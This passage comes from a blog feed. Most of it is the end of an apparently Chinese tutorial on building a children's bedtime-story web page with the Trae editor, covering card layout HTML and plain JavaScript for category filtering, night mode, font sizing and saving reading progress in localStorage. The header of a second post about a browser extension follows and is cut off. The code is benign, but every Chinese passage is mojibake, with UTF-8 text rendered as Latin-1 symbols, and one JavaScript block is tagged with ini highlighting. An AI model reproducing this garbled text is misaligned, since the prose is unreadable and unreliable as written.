    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"category-btn bg-pink-100 text-pink-600 px-4 py-2 rounded-full text-sm font-medium active"</span> <span class="hljs-attr">data-category</span>=<span class="hljs-string">"all"</span>&gt;</span>å…¨éƒ¨æ•…äº‹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"category-btn bg-green-100 text-green-600 px-4 py-2 rounded-full text-sm font-medium"</span> <span class="hljs-attr">data-category</span>=<span class="hljs-string">"animal"</span>&gt;</span>åŠ¨ç‰©æ•…äº‹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"category-btn bg-yellow-100 text-yellow-600 px-4 py-2 rounded-full text-sm font-medium"</span> <span class="hljs-attr">data-category</span>=<span class="hljs-string">"fantasy"</span>&gt;</span>å¥‡å¹»å†’é™©<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"category-btn bg-blue-100 text-blue-600 px-4 py-2 rounded-full text-sm font-medium"</span> <span class="hljs-attr">data-category</span>=<span class="hljs-string">"family"</span>&gt;</span>äº²æƒ…å‹æƒ…<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-comment">&lt;!-- æ•…äº‹å¡ç‰‡å®¹å™¨ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"storyContainer"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- æ•…äº‹å¡ç‰‡ç¤ºä¾‹ï¼ˆåŠ¨æ€æ¸²æŸ“ï¼‰ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"story-card bg-white rounded-xl shadow-md overflow-hidden transition-transform hover:scale-105"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">data-category</span>=<span class="hljs-string">"animal"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://picsum.photos/id/237/600/400"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"å°ç†Šçš„èœ‚èœœç½"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"w-full h-48 object-cover"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"p-4"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"font-bold text-lg mb-2 text-gray-800"</span>&gt;</span>å°ç†Šçš„èœ‚èœœç½<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-gray-600 text-sm mb-3"</span>&gt;</span>æ—¶é•¿ï¼š12åˆ†é’Ÿ | ä¸»é¢˜ï¼šåˆ†äº«ä¸å‹è°Š<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-gray-500 text-sm line-clamp-2"</span>&gt;</span>æ£®æ—é‡Œçš„å°ç†Šæœ‰ä¸€ä¸ªè£…æ»¡èœ‚èœœçš„ç½å­ï¼Œä»–ä»æ¥ä¸è‚¯å’Œåˆ«äººåˆ†äº«ï¼Œç›´åˆ°æœ‰ä¸€å¤©æš´é›¨å†²æ¯äº†ä»–çš„å®¶...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mt-4 w-full bg-pink-500 text-white py-2 rounded-lg text-sm read-btn"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"1"</span>&gt;</span>å¼€å§‹é˜…è¯»<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- æ›´å¤šå¡ç‰‡é€šè¿‡JSåŠ¨æ€ç”Ÿæˆ --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>è¿™é‡Œæœ‰ä¸ªå°æŠ€å·§ï¼šç”¨Traeçš„"ä»£ç ç‰‡æ®µä¿å­˜"åŠŸèƒ½ï¼ŒæŠŠå¸¸ç”¨çš„å¡ç‰‡å¸ƒå±€ã€æŒ‰é’®æ ·å¼ä¿å­˜èµ·æ¥ï¼Œåç»­å¼€å‘ç±»ä¼¼é¡µé¢æ—¶ç›´æ¥è°ƒç”¨ï¼Œæ•ˆç‡ç¿»å€ã€‚</p>
<h3 data-id="heading-4">2. æ ¸å¿ƒäº¤äº’ï¼š3ä¸ªæå‡ä½“éªŒçš„å…³é”®é€»è¾‘</h3>
<p>ä½œä¸ºé¢å‘å®¶é•¿å’Œå­©å­çš„äº§å“ï¼Œäº¤äº’å¿…é¡»ç®€å•ç›´è§‚ã€‚æˆ‘é‡ç‚¹å®ç°äº†3ä¸ªæ ¸å¿ƒé€»è¾‘ï¼Œéƒ½ç”¨åŸç”ŸJSå®Œæˆï¼Œé¿å…å¼•å…¥å¤šä½™æ¡†æ¶å¢åŠ è´Ÿæ‹…ã€‚</p>
<h4 data-id="heading-5">ï¼ˆ1ï¼‰æ•…äº‹åˆ†ç±»ä¸ç­›é€‰</h4>
<p>ç»™æ¯ä¸ªæ•…äº‹å¡ç‰‡æ·»åŠ <code>data-category</code>å±æ€§ï¼Œç‚¹å‡»åˆ†ç±»æ ‡ç­¾æ—¶ç­›é€‰å¯¹åº”å¡ç‰‡ï¼Œç”¨ç±»ååˆ‡æ¢å®ç°é€‰ä¸­çŠ¶æ€é«˜äº®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// åˆ†ç±»ç­›é€‰é€»è¾‘
const <span class="hljs-attr">categoryBtns</span> = document.querySelectorAll(<span class="hljs-string">'.category-btn'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">storyCards</span> = document.querySelectorAll(<span class="hljs-string">'.story-card'</span>)<span class="hljs-comment">;</span>

categoryBtns.forEach(<span class="hljs-attr">btn</span> =&gt; {
  btn.addEventListener('click', () =&gt; {
    // åˆ‡æ¢æŒ‰é’®é€‰ä¸­çŠ¶æ€
    categoryBtns.forEach(<span class="hljs-attr">b</span> =&gt; b.classList.remove(<span class="hljs-string">'active'</span>, <span class="hljs-string">'bg-pink-500'</span>, <span class="hljs-string">'text-white'</span>))<span class="hljs-comment">;</span>
    btn.classList.add('active', 'bg-pink-500', 'text-white')<span class="hljs-comment">;</span>
    
    const <span class="hljs-attr">category</span> = btn.dataset.category<span class="hljs-comment">;</span>
    // ç­›é€‰å¡ç‰‡
    storyCards.forEach(<span class="hljs-attr">card</span> =&gt; {
      if (<span class="hljs-attr">category</span> === <span class="hljs-string">'all'</span> || card.dataset.category === category) {
        <span class="hljs-attr">card.style.display</span> = <span class="hljs-string">'block'</span><span class="hljs-comment">;</span>
      } else {
        <span class="hljs-attr">card.style.display</span> = <span class="hljs-string">'none'</span><span class="hljs-comment">;</span>
      }
    })<span class="hljs-comment">;</span>
  })<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-6">ï¼ˆ2ï¼‰å¤œé—´æ¨¡å¼ä¸å­—ä½“è°ƒæ•´</h4>
<p>è€ƒè™‘åˆ°ç¡å‰ä½¿ç”¨åœºæ™¯ï¼Œå¤œé—´æ¨¡å¼æ˜¯åˆšéœ€ã€‚é€šè¿‡ä¿®æ”¹æ ¹å…ƒç´ ç±»ååˆ‡æ¢æ ·å¼ï¼ŒåŒæ—¶æ”¯æŒ3ç§å­—ä½“å¤§å°è°ƒæ•´ï¼Œæ»¡è¶³ä¸åŒå¹´é¾„æ®µå­©å­çš„é˜…è¯»éœ€æ±‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// å¤œé—´æ¨¡å¼åˆ‡æ¢
const <span class="hljs-attr">nightModeBtn</span> = document.getElementById(<span class="hljs-string">'nightModeBtn'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">html</span> = document.documentElement<span class="hljs-comment">;</span>
const <span class="hljs-attr">navbar</span> = document.getElementById(<span class="hljs-string">'navbar'</span>)<span class="hljs-comment">;</span>

nightModeBtn.addEventListener('click', () =&gt; {
  html.classList.toggle('dark')<span class="hljs-comment">;</span>
  navbar.classList.toggle('bg-white')<span class="hljs-comment">;</span>
  navbar.classList.toggle('bg-gray-900')<span class="hljs-comment">;</span>
  
  // åˆ‡æ¢å›¾æ ‡
  const <span class="hljs-attr">svg</span> = nightModeBtn.querySelector(<span class="hljs-string">'svg'</span>)<span class="hljs-comment">;</span>
  if (html.classList.contains('dark')) {
    <span class="hljs-attr">svg.innerHTML</span> = <span class="hljs-string">'&lt;path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" /&gt;'</span><span class="hljs-comment">;</span>
    svg.classList.remove('text-yellow-400')<span class="hljs-comment">;</span>
    svg.classList.add('text-blue-300')<span class="hljs-comment">;</span>
  } else {
    <span class="hljs-attr">svg.innerHTML</span> = <span class="hljs-string">'&lt;path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" /&gt;'</span><span class="hljs-comment">;</span>
    svg.classList.remove('text-blue-300')<span class="hljs-comment">;</span>
    svg.classList.add('text-yellow-400')<span class="hljs-comment">;</span>
  }
})<span class="hljs-comment">;</span>

// å­—ä½“å¤§å°è°ƒæ•´ï¼ˆè¯¦æƒ…é¡µé€»è¾‘ï¼‰
function initFontSizeControl() {
  const <span class="hljs-attr">sizeBtns</span> = document.querySelectorAll(<span class="hljs-string">'.font-size-btn'</span>)<span class="hljs-comment">;</span>
  const <span class="hljs-attr">storyContent</span> = document.getElementById(<span class="hljs-string">'storyContent'</span>)<span class="hljs-comment">;</span>
  
  sizeBtns.forEach(<span class="hljs-attr">btn</span> =&gt; {
    btn.addEventListener('click', () =&gt; {
      sizeBtns.forEach(<span class="hljs-attr">b</span> =&gt; b.classList.remove(<span class="hljs-string">'active'</span>))<span class="hljs-comment">;</span>
      btn.classList.add('active')<span class="hljs-comment">;</span>
      
      const <span class="hljs-attr">size</span> = btn.dataset.size<span class="hljs-comment">;</span>
      switch(size) {
        case 'small':
          <span class="hljs-attr">storyContent.style.fontSize</span> = <span class="hljs-string">'16px'</span><span class="hljs-comment">;</span>
          break<span class="hljs-comment">;</span>
        case 'medium':
          <span class="hljs-attr">storyContent.style.fontSize</span> = <span class="hljs-string">'18px'</span><span class="hljs-comment">;</span>
          break<span class="hljs-comment">;</span>
        case 'large':
          <span class="hljs-attr">storyContent.style.fontSize</span> = <span class="hljs-string">'22px'</span><span class="hljs-comment">;</span>
          break<span class="hljs-comment">;</span>
      }
      // ä¿å­˜åˆ°æœ¬åœ°å­˜å‚¨ï¼Œä¸‹æ¬¡æ‰“å¼€è®°å¿†çŠ¶æ€
      localStorage.setItem('fontSize', size)<span class="hljs-comment">;</span>
    })<span class="hljs-comment">;</span>
  })<span class="hljs-comment">;</span>
  
  // è¯»å–æœ¬åœ°å­˜å‚¨çš„å­—ä½“å¤§å°
  const <span class="hljs-attr">savedSize</span> = localStorage.getItem(<span class="hljs-string">'fontSize'</span>) || <span class="hljs-string">'medium'</span><span class="hljs-comment">;</span>
  document.querySelector(`.font-size-btn<span class="hljs-section">[data-size="${savedSize}"]</span>`).click()<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-7">ï¼ˆ3ï¼‰æ•…äº‹è¿›åº¦è®°å¿†</h4>
<p>å®¶é•¿åé¦ˆå­©å­å¯èƒ½ä¸€æ¬¡å¬ä¸å®Œæ•…äº‹ï¼Œæ‰€ä»¥æ·»åŠ äº†è¿›åº¦è®°å¿†åŠŸèƒ½ï¼Œç”¨localStorageä¿å­˜é˜…è¯»ä½ç½®ï¼Œä¸‹æ¬¡æ‰“å¼€ç›´æ¥å®šä½åˆ°ä¸Šæ¬¡è¯»åˆ°çš„åœ°æ–¹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¿›åº¦è®°å¿†åŠŸèƒ½</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">saveReadingProgress</span>(<span class="hljs-params">storyId, scrollTop</span>) {
  <span class="hljs-keyword">const</span> progress = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'readingProgress'</span>) || <span class="hljs-string">'{}'</span>);
  progress[storyId] = scrollTop;
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'readingProgress'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(progress));
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">getReadingProgress</span>(<span class="hljs-params">storyId</span>) {
  <span class="hljs-keyword">const</span> progress = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'readingProgress'</span>) || <span class="hljs-string">'{}'</span>);
  <span class="hljs-keyword">return</span> progress[storyId] || <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// è¯¦æƒ…é¡µæ»šåŠ¨æ—¶ä¿å­˜è¿›åº¦</span>
<span class="hljs-keyword">const</span> storyContent = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'storyContent'</span>);
<span class="hljs-keyword">if</span> (storyContent) {
  <span class="hljs-keyword">const</span> storyId = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'='</span>)[<span class="hljs-number">1</span>];
  <span class="hljs-comment">// åŠ è½½ä¸Šæ¬¡è¿›åº¦</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> scrollTop = <span class="hljs-title function_">getReadingProgress</span>(storyId);
    storyContent.<span class="hljs-property">scrollTop</span> = scrollTop;
  });
  <span class="hljs-comment">// æ»šåŠ¨æ—¶ä¿å­˜è¿›åº¦</span>
  storyContent.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">saveReadingProgress</span>(storyId, storyContent.<span class="hljs-property">scrollTop</span>);
  });
}
</code></pre>
<h2 data-id="heading-8">Trae Soloæ¨¡å¼å¼€å‘ä½“éªŒï¼šè¿™äº›äº®ç‚¹å€¼å¾—å¤¸</h2>
<p>ä½œä¸ºå¸¸å¹´ç”¨VS Codeå¼€å‘çš„å¼€å‘è€…ï¼Œè¿™æ¬¡ç”¨Trae Soloæ¨¡å¼çš„ä½“éªŒè¶…å‡ºé¢„æœŸï¼Œå°¤å…¶è¿™3ä¸ªäº®ç‚¹è®©æˆ‘å°è±¡æ·±åˆ»ï¼š</p>
<ul>
<li><strong>é›¶é…ç½®ç¯å¢ƒ</strong>ï¼šæ‰“å¼€æµè§ˆå™¨å°±èƒ½å†™ä»£ç ï¼Œå†…ç½®çš„Tailwindã€Font Awesomeç­‰èµ„æºç›´æ¥è°ƒç”¨ï¼Œä¸ç”¨å†é…ç½®webpackæˆ–viteï¼Œå¯¹æ–°æ‰‹æåº¦å‹å¥½</li>
<li><strong>å®æ—¶é¢„è§ˆ+è°ƒè¯•</strong>ï¼šå³ä¾§é¢„è§ˆçª—å£æ”¯æŒæ‰‹æœºã€å¹³æ¿ã€æ¡Œé¢å¤šè®¾å¤‡åˆ‡æ¢ï¼Œè°ƒè¯•å“åº”å¼å¸ƒå±€æ—¶ä¸ç”¨é¢‘ç¹åˆ‡æ¢æµè§ˆå™¨çª—å£ï¼Œè¿˜èƒ½ç›´æ¥åœ¨é¢„è§ˆåŒºæ£€æŸ¥å…ƒç´ </li>
<li><strong>ä¸€é”®éƒ¨ç½²</strong>ï¼šå¼€å‘å®Œæˆåç‚¹å‡»"éƒ¨ç½²"æŒ‰é’®ï¼Œè‡ªåŠ¨ç”Ÿæˆä¸´æ—¶é“¾æ¥ï¼Œç›´æ¥åˆ†äº«ç»™å®å¦ˆä»¬ä½¿ç”¨ï¼Œçœå»äº†è´­ä¹°æœåŠ¡å™¨ã€é…ç½®åŸŸåçš„éº»çƒ¦ï¼ˆæ­£å¼ä¸Šçº¿å¯ç»‘å®šè‡ªå®šä¹‰åŸŸåï¼‰</li>
</ul>
<h2 data-id="heading-9">ä¼˜åŒ–æ–¹å‘ä¸åç»­è®¡åˆ’</h2>
<p>ç›®å‰è¿™ä¸ªç½‘é¡µè¿˜å¤„äº1.0ç‰ˆæœ¬ï¼Œæ ¹æ®å®å¦ˆä»¬çš„åé¦ˆï¼Œåç»­æ‰“ç®—ç”¨Traeçš„åä½œæ¨¡å¼å’Œå…¶ä»–å¼€å‘è€…ä¸€èµ·è¿­ä»£ï¼š</p>
<ol>
<li>æ·»åŠ "æ•…äº‹æœ—è¯»"åŠŸèƒ½ï¼šé›†æˆTTSè¯­éŸ³æ¥å£ï¼Œæ”¯æŒä¸€é”®æœ—è¯»ï¼Œè§£æ”¾å®¶é•¿çš„å—“å­</li>
<li>å¢åŠ å®¶é•¿æ§åˆ¶åŠŸèƒ½ï¼šå¯è®¾ç½®å•æ¬¡é˜…è¯»æ—¶é•¿ï¼Œé¿å…å­©å­ç¡å‰è¿‡åº¦ä½¿ç”¨ç”µå­è®¾å¤‡</li>
<li>å»ºç«‹æ•…äº‹æŠ•ç¨¿æœºåˆ¶ï¼šè®©å®¶é•¿å’Œè€å¸ˆå¯ä»¥ä¸Šä¼ åŸåˆ›æ•…äº‹ï¼Œä¸°å¯Œå†…å®¹åº“</li>
</ol>
<h2 data-id="heading-10">æœ€åï¼šé™„é¡¹ç›®åœ°å€ä¸å¼€å‘å¿ƒå¾—</h2>
<p>è¿™æ¬¡å®æˆ˜è®©æˆ‘æ·±åˆ»æ„Ÿå—åˆ°ï¼š<strong>å¥½çš„å·¥å…·èƒ½è®©å¼€å‘è€…æ›´ä¸“æ³¨äºéœ€æ±‚æœ¬èº«</strong>ã€‚Trae Soloæ¨¡å¼è™½ç„¶è½»é‡åŒ–ï¼Œä½†è¶³ä»¥æ”¯æ’‘ä¸­å°å‹å‰ç«¯é¡¹ç›®çš„å¼€å‘ï¼Œå°¤å…¶é€‚åˆå¿«é€ŸåŸå‹åˆ¶ä½œã€ç‹¬ç«‹å¼€å‘æˆ–æ•™å­¦åœºæ™¯ã€‚å¦‚æœä½ ä¹Ÿæ˜¯ç‹¬ç«‹å¼€å‘è€…æˆ–å‰ç«¯æ–°æ‰‹ï¼Œå¼ºçƒˆå»ºè®®è¯•è¯•è¿™ç§"å³å¼€å³å†™"çš„å¼€å‘æ–¹å¼ï¼Œå¯èƒ½ä¼šæ‰“å¼€æ–°çš„æ€è·¯ã€‚</p>
<p>å¦‚æœå¤§å®¶å¯¹ä»£ç ç»†èŠ‚æœ‰ç–‘é—®ï¼Œæˆ–è€…æœ‰æ›´å¥½çš„ä¼˜åŒ–å»ºè®®ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºäº¤æµï½ æˆ‘ä¼šæŒç»­æ›´æ–°é¡¹ç›®è¿›å±•ï¼Œä¹Ÿä¼šåˆ†äº«æ›´å¤šTraeçš„ä½¿ç”¨æŠ€å·§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€AI-9/Lesson30(2025-11-12)ã€‘AI + Vibe Codingï¼šHulk æµè§ˆå™¨æ‰©å±•å¼€å‘å…¨è§£æ â€”â€” ä»éœ€æ±‚æ–‡æ¡£åˆ°å®æˆ˜çš„å®Œæ•´æŒ‡å—ğŸŒˆ]]></title>    <link>https://juejin.cn/post/7582202149910020105</link>    <guid>https://juejin.cn/post/7582202149910020105</guid>    <pubDate>2025-12-11T08:43:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582202149910020105" data-draft-id="7582232291621044262" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€AI-9/Lesson30(2025-11-12)ã€‘AI + Vibe Codingï¼šHulk æµè§ˆå™¨æ‰©å±•å¼€å‘å…¨è§£æ â€”â€” ä»éœ€æ±‚æ–‡æ¡£åˆ°å®æˆ˜çš„å®Œæ•´æŒ‡å—ğŸŒˆ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,å‰ç«¯,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-11T08:43:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jing_Rainbow"/> <meta itemprop="url" content="https://juejin.cn/user/1285809519198256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€AI-9/Lesson30(2025-11-12)ã€‘AI + Vibe Codingï¼šHulk æµè§ˆå™¨æ‰©å±•å¼€å‘å…¨è§£æ â€”â€” ä»éœ€æ±‚æ–‡æ¡£åˆ°å®æˆ˜çš„å®Œæ•´æŒ‡å—ğŸŒˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1285809519198256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jing_Rainbow
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T08:43:57.000Z" title="Thu Dec 11 2025 08:43:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ğŸŒˆåœ¨å½“ä»Šä½ä»£ç ä¸ AI ç¼–ç¨‹ä»£ç†ï¼ˆå¦‚ Traeï¼‰é€æ¸æ™®åŠçš„æ—¶ä»£ï¼Œå¼€å‘è€…çš„å·¥ä½œé‡å¿ƒæ­£ä»â€œå†™ä»£ç â€è½¬å‘â€œæä¾›æ¸…æ™°ä¸Šä¸‹æ–‡â€ã€‚æœ¬æ–‡å°†ä»¥ä¸€ä¸ªåä¸º <strong>Hulk</strong> çš„ Chrome/Edge 